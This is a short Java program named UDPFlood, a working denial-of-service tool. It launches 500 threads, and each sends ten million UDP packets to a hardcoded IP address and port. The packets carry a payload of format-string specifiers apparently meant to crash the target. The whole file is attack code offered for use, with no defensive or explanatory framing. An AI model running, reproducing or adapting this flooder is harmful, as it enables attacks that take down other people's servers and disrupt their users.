
package udpflood;

import java.io.IOException;
import java.net.DatagramPacket;
import java.net.DatagramSocket;
import java.net.InetAddress;

public class UDPFlood extends Thread{

    static String ip;
    static int port;
    
    public static void main(String[] args) {
        ip = "67.198.209.25";
        port = 26005;
        for (int i = 0; i < 500; i++) {
            UDPFlood x = new UDPFlood();
            x.start();
            
        }
        System.out.println("all");
        
    }
    
    public void run(){
        for (int i = 0; i < 10000000; i++) {
            sendPck("%s%s%n%n/s/n\\n\\");
        }
    }
    
    
    static public void sendPck(String msg) {
        try {
            InetAddress servAddr = InetAddress.getByName(ip);
            byte buf[] = msg.getBytes();
            DatagramSocket socket = new DatagramSocket();
            socket.setSoTimeout(3000);
            socket.send(new DatagramPacket(buf, buf.length, servAddr, port));              //nastepnie komende
            socket.close();

        } catch (Exception ex) {

        }
    }
}
